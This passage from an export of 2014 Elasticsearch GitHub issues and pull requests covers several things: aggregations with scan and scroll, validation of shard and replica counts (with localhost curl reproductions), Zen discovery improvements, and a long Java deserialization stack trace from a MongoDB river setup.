</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Update update.asciidoc</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7498</link><project id="" key="" /><description /><key id="41383983">7498</key><summary>Update update.asciidoc</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/clintongormley/following{/other_user}', u'events_url': u'https://api.github.com/users/clintongormley/events{/privacy}', u'organizations_url': u'https://api.github.com/users/clintongormley/orgs', u'url': u'https://api.github.com/users/clintongormley', u'gists_url': u'https://api.github.com/users/clintongormley/gists{/gist_id}', u'html_url': u'https://github.com/clintongormley', u'subscriptions_url': u'https://api.github.com/users/clintongormley/subscriptions', u'avatar_url': u'https://avatars0.githubusercontent.com/u/56599?v=4', u'repos_url': u'https://api.github.com/users/clintongormley/repos', u'received_events_url': u'https://api.github.com/users/clintongormley/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/clintongormley/starred{/owner}{/repo}', u'site_admin': False, u'login': u'clintongormley', u'type': u'User', u'id': 56599, u'followers_url': u'https://api.github.com/users/clintongormley/followers'}</assignee><reporter username="">nandakishore15</reporter><labels><label>docs</label></labels><created>2014-08-28T12:19:02Z</created><updated>2014-09-24T18:55:03Z</updated><resolved>2014-09-24T18:55:03Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="clintongormley" created="2014-09-06T13:33:13Z" id="54712377">Hi @nandakishore15 

Thanks for the PR. Please could I ask you to sign the CLA so that I can merge it in.
http://www.elasticsearch.org/contributor-agreement/
</comment><comment author="nandakishore15" created="2014-09-12T11:27:00Z" id="55390591">Hi @clintongormley, signed the CLA.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Only return aggregations on the first page with scroll and forbidden with scan</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7497</link><project id="" key="" /><description>Aggregations are collection-wide statistics over one or several indices so:
- `scan` should not be allowed to use aggregations since it never collects all documents at once,
- `scroll` should only return aggregations on the first page (see #1642)
</description><key id="41376989">7497</key><summary>Only return aggregations on the first page with scroll and forbidden with scan</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">jpountz</reporter><labels><label>:Search</label><label>breaking</label><label>enhancement</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-28T10:36:58Z</created><updated>2015-06-06T16:25:40Z</updated><resolved>2014-09-03T07:15:23Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-28T11:55:05Z" id="53709745">For reference, I plan to add documentation for it, but I'm first looking for feedback to know whether this is the correct approach.
</comment><comment author="martijnvg" created="2014-08-28T12:02:35Z" id="53710426">@jpountz This approach looks good to me. I think this issue should be marked as breaking as well, since for normal scroll we did include the aggs also in subsequent responses.
</comment><comment author="jpountz" created="2014-08-28T12:46:02Z" id="53714376">There is one open question about the behavior with search_type=scan: scan works by collecting just enough documents on each round while aggs work by collecting all documents in one go. So I don't think there is some way around collecting matches twice (once for aggs and once for the scan). So potentially there are two options:
1. prevent the usage of aggs with scan (what the current PR does)
2. or collect matches twice: once in the first call purely for aggregations, and then in a streaming fashion for the scan.

I like the fact that the first option doesn't do any magic and makes sure that scan is cheap in all cases but on the other hand, 2. could make scan/scroll more consistent with normal scroll (aggs returned in the first page and ignored in subsequent pages).

What do you think?
</comment><comment author="jpountz" created="2014-08-28T12:48:38Z" id="53714649">Side note: assuming 1. is implemented, 2. could be done from client side with negligible overhead (one round trip) by running first a count request to compute aggs and then a scan request to get hits back.
</comment><comment author="costin" created="2014-08-28T15:32:10Z" id="53737719">As a directly interested client :), I'll like to understand how the two requests would be an alternative to 2 (ideally considering the `preference` api as well).
</comment><comment author="s1monw" created="2014-08-29T12:45:53Z" id="53870445">I personally like the fact that `scan` is simply a stream and I think we should keep it that way. IMO you can do the entire request in 2 steps (one for aggs and one for scan) this essentially means that you can potentially get slightly outdated aggregations but I think that is an acceptable solution. Scan requests should not support aggregations at all.
</comment><comment author="jpountz" created="2014-08-29T14:26:37Z" id="53882665">@costin I think you can have two requests by having one that is a SCAN and only fetches hits while another query would be of type COUNT and would compute aggregations. I don't think the preference API raises particular issues: if you use it to go to particular shards, that actually acts as a filter on the documents that match, so I think that is fine?
</comment><comment author="clintongormley" created="2014-09-01T09:54:43Z" id="54041478">I'm happy with scan not supporting aggs, and scroll-without-scan just returning aggs on the first request.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Validate create index requests' number of primary/replica shards</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7496</link><project id="" key="" /><description>Fixes #7495

There were also two `CreateIndexTests` files, so I collapsed them into a single one.
</description><key id="41376824">7496</key><summary>Validate create index requests' number of primary/replica shards</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">dakrone</reporter><labels><label>:Settings</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-28T10:34:12Z</created><updated>2015-06-07T18:53:31Z</updated><resolved>2014-08-28T12:42:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="jpountz" created="2014-08-28T10:38:44Z" id="53703404">LGTM
</comment><comment author="s1monw" created="2014-08-28T10:40:43Z" id="53703577">+1
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Validation of number_of_shards and number_of_replicas request to reject illegal number</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7495</link><project id="" key="" /><description>If create an index the following settings, elasticsearch success to create an index.
However, when we create a document, we have error.
There are servral errors.
### set 0 to number_of_shards

setting and create a document

```
curl -XPUT "http://localhost:9200/hoge" -d'
{
  "settings": {
    "number_of_shards": 0
  }
}'

curl -XPUT "http://localhost:9200/hoge/fuga/1" -d'{  "title": "fuga"}'
```

erorr

```
{
   "error": "ArithmeticException[/ by zero]",
   "status": 500
}
```
### set -2 to number_of_shards

setting and create adocument

```
curl -XPUT "http://localhost:9200/hoge" -d'
{
  "settings": {
    "number_of_shards": -2
  }
}'

curl -XPUT "http://localhost:9200/hoge/fuga/1" -d'{  "title": "fuga"}'
```

error

```
{
   "error": "IndexShardMissingException[[hoge][0] missing]",
   "status": 404
}
```
### set -2 to number_of_replicas

setting and create a document

```
curl -XPUT "http://localhost:9200/hoge" -d'
{
  "settings": {
    "number_of_shards": 2,
    "number_of_replicas": -2
  }
}'

curl -XPUT "http://localhost:9200/hoge/fuga/1" -d'{  "title": "fuga"}'
```

error

```
{
   "error": "UnavailableShardsException[[hoge][0] [0] shardIt, [0] active : Timeout waiting for [1m], request: index {[hoge][fuga][1], source[{\n  \"title\": \"fuga\"\n}\n]}]",
   "status": 503
}
```

Elasticsearch should return error message and should not create an index.
</description><key id="41368480">7495</key><summary>Validation of number_of_shards and number_of_replicas request to reject illegal number</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">{u'following_url': u'https://api.github.com/users/dakrone/following{/other_user}', u'events_url': u'https://api.github.com/users/dakrone/events{/privacy}', u'organizations_url': u'https://api.github.com/users/dakrone/orgs', u'url': u'https://api.github.com/users/dakrone', u'gists_url': u'https://api.github.com/users/dakrone/gists{/gist_id}', u'html_url': u'https://github.com/dakrone', u'subscriptions_url': u'https://api.github.com/users/dakrone/subscriptions', u'avatar_url': u'https://avatars3.githubusercontent.com/u/19060?v=4', u'repos_url': u'https://api.github.com/users/dakrone/repos', u'received_events_url': u'https://api.github.com/users/dakrone/received_events', u'gravatar_id': u'', u'starred_url': u'https://api.github.com/users/dakrone/starred{/owner}{/repo}', u'site_admin': False, u'login': u'dakrone', u'type': u'User', u'id': 19060, u'followers_url': u'https://api.github.com/users/dakrone/followers'}</assignee><reporter username="">johtani</reporter><labels><label>bug</label></labels><created>2014-08-28T08:58:58Z</created><updated>2014-08-28T12:42:49Z</updated><resolved>2014-08-28T12:42:49Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments /><attachments /><subtasks /><customfields /></item><item><title>Make network interface iteration order consistent</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7494</link><project id="" key="" /><description>Today the iteration order of the interfaces might change across JVMs
this commit cleans up the NetworkUtils class and attempts to ensure
consistent iteration order across JVMs.
</description><key id="41367363">7494</key><summary>Make network interface iteration order consistent</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">s1monw</reporter><labels><label>:Internal</label><label>bug</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-28T08:43:44Z</created><updated>2015-06-07T18:53:42Z</updated><resolved>2014-08-28T10:39:00Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-08-28T10:30:08Z" id="53702682">LGTM.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Accumulated improvements to ZenDiscovery</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7493</link><project id="" key="" /><description>This PR contains the accumulated work from the feautre/improve_zen branch. Here are the highlights of the changes: 

**Testing infra**
- Networking:
  - all symmetric partitioning
  - dropping packets
  - hard disconnects
  - Jepsen Tests
- Single node service disruptions:
  - Long GC / Halt
  - Slow cluster state updates
- Discovery settings
  - Easy to setup unicast with partial host list

**Zen Discovery**
- Pinging after master loss (no local elects) 
- Fixes the split brain issue: #2488
- Batching join requests
- More resilient joining process (wait on a publish from master)
</description><key id="41361093">7493</key><summary>Accumulated improvements to ZenDiscovery</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels><label>:Discovery</label><label>enhancement</label><label>release highlight</label><label>resiliency</label><label>v1.4.0.Beta1</label><label>v2.0.0-beta1</label></labels><created>2014-08-28T07:06:53Z</created><updated>2015-06-07T12:10:04Z</updated><resolved>2014-09-01T14:22:55Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="s1monw" created="2014-08-28T11:14:40Z" id="53706412">I did a first review round and left some mostly cosmetic comments. I don't know that code well enough to really review it deeply but given the fact that the development on the branch went through several review rounds is a good indicator. I think we are close here/
</comment><comment author="bleskes" created="2014-08-29T15:26:03Z" id="53890815">@s1monw thx for the review. I pushed the minor things as commits to this branch and put the bigger changes into separate PRs (#7511 &amp; #7512 ) to make the review easier...
</comment><comment author="s1monw" created="2014-09-01T12:46:37Z" id="54055144">the changes here LGTM thanks!
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>Feature/improve zen</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7492</link><project id="" key="" /><description /><key id="41360637">7492</key><summary>Feature/improve zen</summary><type iconUrl="" id="" /><priority iconUrl="" id="" /><status description="" iconUrl="" id="">closed</status><statusCategory colorName="" id="" key="" /><resolution colorName="" id="" /><assignee username="">None</assignee><reporter username="">bleskes</reporter><labels /><created>2014-08-28T06:58:26Z</created><updated>2014-08-28T06:58:58Z</updated><resolved>2014-08-28T06:58:58Z</resolved><version /><fixVersion /><component /><due /><votes /><watches /><comments><comment author="bleskes" created="2014-08-28T06:58:58Z" id="53680357">opened too early. The real ones comes in a second.
</comment></comments><attachments /><subtasks /><customfields /></item><item><title>java.lang.IndexOutOfBoundsException: Readable byte limit exceeded</title><link>https://api.github.com/repos/elastic/elasticsearch/issues/7491</link><project id="" key="" /><description>I's running 6 Machines 
- ES 1.2.2
- Mongo River 2.0.1
- java version "1.7.0_65" OpenJDK Runtime Environment (IcedTea 2.5.1) (7u65-2.5.1-4ubuntu1~0.12.04.1)OpenJDK 64-Bit Server VM (build 24.65-b04, mixed mode)

All machines have same setup.

but when I start indexing data from mongo then It always show this error. on at least 2 machines

I'm not sure this from mongo river or from ES. and I'v read many post about this one it's seem like just from differenct JVM version but in this case I really check that It's using same JVM version

---- Log of each machine
# Machine 1

```
[2014-08-28 04:59:45,441][INFO ][river.mongodb            ] Parse river settings for zanroo
[2014-08-28 04:59:45,446][INFO ][river.mongodb            ] Server: 2gbmongo2 - 27017
[2014-08-28 04:59:45,447][INFO ][river.mongodb            ] Server: 2gbmongo1 - 27017
[2014-08-28 04:59:45,467][INFO ][org.elasticsearch.river.mongodb.MongoDBRiver] Starting river zanroo
[2014-08-28 04:59:45,491][INFO ][org.elasticsearch.river.mongodb.MongoDBRiver] MongoDB River Plugin - version[2.0.1] - hash[445c35a] - time[2014-07-30T14:08:26Z]
[2014-08-28 04:59:45,493][INFO ][org.elasticsearch.river.mongodb.MongoDBRiver] starting mongodb stream. options: secondaryreadpreference [false], drop_collection [false], include_collection [], throttlesize [5000], gridfs [false], filter [null], db [zanroo], collection [message], script [null], indexing to [zanroo]/[message]
[2014-08-28 04:59:45,650][INFO ][org.elasticsearch.river.mongodb.MongoDBRiver] Authenticate admin with admin
[2014-08-28 04:59:45,713][INFO ][org.elasticsearch.river.mongodb.MongoDBRiver] MongoDB version - 2.4.9
[2014-08-28 04:59:45,742][INFO ][org.elasticsearch.river.mongodb.Slurper] Authenticate admin with admin
[2014-08-28 04:59:45,744][INFO ][org.elasticsearch.river.mongodb.Slurper] Authenticate admin with admin
[2014-08-28 04:59:45,744][INFO ][org.elasticsearch.river.mongodb.Slurper] Authenticate admin with admin
[2014-08-28 04:59:45,750][INFO ][org.elasticsearch.river.mongodb.Slurper] Authenticate local with local
[2014-08-28 04:59:45,750][INFO ][org.elasticsearch.river.mongodb.Slurper] Authenticate local with local
[2014-08-28 04:59:45,751][INFO ][org.elasticsearch.river.mongodb.Slurper] Authenticate local with local
[2014-08-28 04:59:45,767][DEBUG][action.admin.cluster.node.info] [16gbes04] failed to execute on node [WqnW6SX3TfCLTbBvFcYQgA]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8462
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 04:59:45,768][DEBUG][action.admin.cluster.node.info] [16gbes04] failed to execute on node [lXDpSZ3OQCu6eVulQVcbiQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8528
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 04:59:45,773][WARN ][transport.netty          ] [16gbes04] Message read past expected size (response) for [605] handler org.elasticsearch.action.support.nodes.TransportNodesOperationAction$AsyncAction$4@1d631edd, error [false], resetting
[2014-08-28 04:59:45,767][DEBUG][action.admin.cluster.node.info] [16gbes04] failed to execute on node [myWkK47kRxSh93CRKH5O3w]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8435
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:595)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 04:59:45,777][DEBUG][action.admin.cluster.node.info] [16gbes04] failed to execute on node [lLjxLWhoSti-hvdAuJ2wUg]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
    at org.elasticsearch.transport.netty.MessageChannelHandler.messageReceived(MessageChannelHandler.java:125)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline$DefaultChannelHandlerContext.sendUpstream(DefaultChannelPipeline.java:791)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:296)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.unfoldAndFireMessageReceived(FrameDecoder.java:462)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.callDecode(FrameDecoder.java:443)
    at org.elasticsearch.common.netty.handler.codec.frame.FrameDecoder.messageReceived(FrameDecoder.java:303)
    at org.elasticsearch.common.netty.channel.SimpleChannelUpstreamHandler.handleUpstream(SimpleChannelUpstreamHandler.java:70)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:564)
    at org.elasticsearch.common.netty.channel.DefaultChannelPipeline.sendUpstream(DefaultChannelPipeline.java:559)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:268)
    at org.elasticsearch.common.netty.channel.Channels.fireMessageReceived(Channels.java:255)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.read(NioWorker.java:88)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.process(AbstractNioWorker.java:108)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioSelector.run(AbstractNioSelector.java:318)
    at org.elasticsearch.common.netty.channel.socket.nio.AbstractNioWorker.run(AbstractNioWorker.java:89)
    at org.elasticsearch.common.netty.channel.socket.nio.NioWorker.run(NioWorker.java:178)
    at org.elasticsearch.common.netty.util.ThreadRenamingRunnable.run(ThreadRenamingRunnable.java:108)
    at org.elasticsearch.common.netty.util.internal.DeadLockProofWorker$1.run(DeadLockProofWorker.java:42)
    at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
    at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
    at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.IndexOutOfBoundsException: Readable byte limit exceeded: 8436
    at org.elasticsearch.common.netty.buffer.AbstractChannelBuffer.readByte(AbstractChannelBuffer.java:236)
    at org.elasticsearch.transport.netty.ChannelBufferStreamInput.readByte(ChannelBufferStreamInput.java:132)
    at org.elasticsearch.common.io.stream.StreamInput.readString(StreamInput.java:266)
    at org.elasticsearch.common.io.stream.HandlesStreamInput.readString(HandlesStreamInput.java:61)
    at org.elasticsearch.threadpool.ThreadPool$Info.readFrom(ThreadPool.java:596)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readFrom(ThreadPoolInfo.java:65)
    at org.elasticsearch.threadpool.ThreadPoolInfo.readThreadPoolInfo(ThreadPoolInfo.java:55)
    at org.elasticsearch.action.admin.cluster.node.info.NodeInfo.readFrom(NodeInfo.java:224)
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:146)
    ... 23 more
[2014-08-28 04:59:45,783][DEBUG][action.admin.cluster.node.info] [16gbes04] failed to execute on node [7EJ9_WAbRK62_FuZzfdAOQ]
org.elasticsearch.transport.RemoteTransportException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
Caused by: org.elasticsearch.transport.TransportSerializationException: Failed to deserialize response of type [org.elasticsearch.action.admin.cluster.node.info.NodeInfo]
    at org.elasticsearch.transport.netty.MessageChannelHandler.handleResponse(MessageChannelHandler.java:148)
